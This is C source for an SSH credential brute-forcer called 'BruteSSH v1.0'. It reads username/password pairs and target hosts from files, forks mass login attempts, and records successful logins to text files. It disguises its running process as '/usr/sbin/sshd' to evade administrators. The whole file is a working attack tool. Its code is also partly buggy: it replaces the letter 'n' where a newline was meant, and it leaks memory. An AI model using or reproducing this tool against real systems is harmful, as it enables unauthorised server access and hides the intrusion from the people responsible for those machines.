/*
* cp /usr/local/lib/libssh.so /usr/lib/
*
* gcc -o update prg.c -I /usr/local/include -L /usr/local/lib/ -lssh -lpthread
*
* passfile: root root
*
*/
#include <stdio.h>
#include <arpa/inet.h>
#include <libssh/libssh.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#define NORM  "\033[00;00m"

#define ALBASTRU "\033[01;34m"
#define FAKE "/usr/sbin/sshd" // fake process

int flag,where;
int shell(SSH_SESSION *session){
struct timeval;
int err;
BUFFER *readbuf=buffer_new();
time_t start;
CHANNEL *channel;
channel = open_session_channel(session,1000,1000);
if(isatty(0))
  err=channel_request_pty(channel); 
err= channel_request_shell(channel);
start=time(0);
while (channel->open!=0) 
  {
   usleep(500000);
   err=channel_poll(channel,0);
   if(err>0){
   err=channel_read(channel,readbuf,0,0);
    }
   else
   {
    if(start+5<time(0))
    {
     return 1;
    }
   }
   }
   return 0;
  }

void checkauth(char *user,char *password,char *host) {
 struct hostent *hp;struct in_addr  *myaddr;
 SSH_SESSION *session;
 SSH_OPTIONS *options;
 int argc=1;
 char *argv[]={"none"};
 FILE *vulnf,*nolog; 
 where++;
 alarm(10);
 options=ssh_getopt(&argc,argv);
 options_set_username(options,user);
 options_set_host(options,host);
 session=ssh_connect(options);
 if(!session) return ;
 if(ssh_userauth_password(session,NULL,password) != AUTH_SUCCESS) 
 {
  ssh_disconnect(session);
  return;
 }
 if(shell(session))
 {
 if(!flag){
  myaddr=(struct in_addr*)malloc(sizeof(struct in_addr));
  myaddr->s_addr=inet_addr(host);
  hp = gethostbyaddr((char *) myaddr,4,AF_INET);
  if((hp!=NULL)){
  vulnf=fopen("vuln.txt","a+");
  fprintf(vulnf,"%s:%s %s -> %s\n",user,password,host,hp->h_name);
  printf("\nCracked -> %s:%s %s -> %s\n",user,password,host,hp->h_name);}
  else{
  vulnf=fopen("root.txt","a+");
  fprintf(vulnf,"%s:%s %s -> Can not solve dns\n",user,password,host);
  printf("\nCracked -> %s:%s %s -> Can not solve dns\n",user,password,host);
  }
//  flag=1;
  fclose(vulnf);
 }
 }
 else{ // if ssh login is denied, printf() && log it
    myaddr=(struct in_addr*)malloc(sizeof(struct in_addr));
    myaddr->s_addr=inet_addr(host);
    hp = gethostbyaddr((char *) myaddr,4,AF_INET);
   nolog=fopen("nologin.txt","a+");
   if((hp!=NULL)){
   fprintf(nolog,"%s %s %s -> %s\n",user,password,host,hp->h_name);
   printf("\nNologin -> %s %s %s -> %s\n",user,password,host,hp->h_name);}
else
{
 fprintf(nolog,"%s %s %s -> n-are host\n",user,password,host);
   printf("\nNologin -> %s %s %s -> n-are host\n",user,password,host);}

   fclose(nolog);
 }
}
int main(int argc, char **argv)
{
 FILE *fp,*passf;
 char *c;
 char buff[4096];
 char *a[80196], nutt[4096], *temp, *t, *string;
 malloc(sizeof(a));
 malloc(sizeof(nutt));
 int count = 0, i;
 int numforks,maxf;
 if((passf=fopen("pass_file","r")) == NULL)
  {
  printf("\e[1;31mFATAL: I have not found pass_file\n"NORM);
  return -1;
  }
   while (fgets(nutt,2024,passf))
      {
        while (t = strchr (nutt,'n'))
        *t = '.';
        temp = strtok (nutt, " ");
        string = strdup (temp);
        a[count++]=string;
         while (temp = strtok (NULL, " "))
          {
              string = strdup (temp);
              a[count++]=string;
          }

             }
 fclose(passf);
 if(argc!=2)
 {
  printf("\n\e[1;31m%s <max forks>\n"NORM,argv[0]);
  exit(0);
 }
 if((fp=fopen("mfu.txt","r"))==NULL) exit(printf("\e[1;31mFATAL: I can't open mfu.txt\n"NORM));
 printf("\e[1;31mBruteSSH v1.0 \e[00;00m- \e[1;32mBy ur mums fanny\n"NORM);
 maxf=atoi(argv[1]);

strcpy(argv[0],FAKE);    // fake the proccess name.
 while(fgets(buff,sizeof(buff),fp))
 {
  c=strchr(buff,'n');
  if(c!=NULL) *c='.';
  if (!(fork()))
  {
  where=0;
//   printf("--> Atacare %s",buff);
 for (i=0; i<count; i=i+2){
//   printf("--> Try %s:%s %s\n",a[i],a[i+1],buff);
     checkauth(a[i],a[i+1],buff); // try to auth
 }
  exit(0);
  }
  else
  {
 numforks++;
 if (numforks > maxf)
 for (numforks; numforks > maxf; numforks--)
 wait(NULL);
  }
 }
}
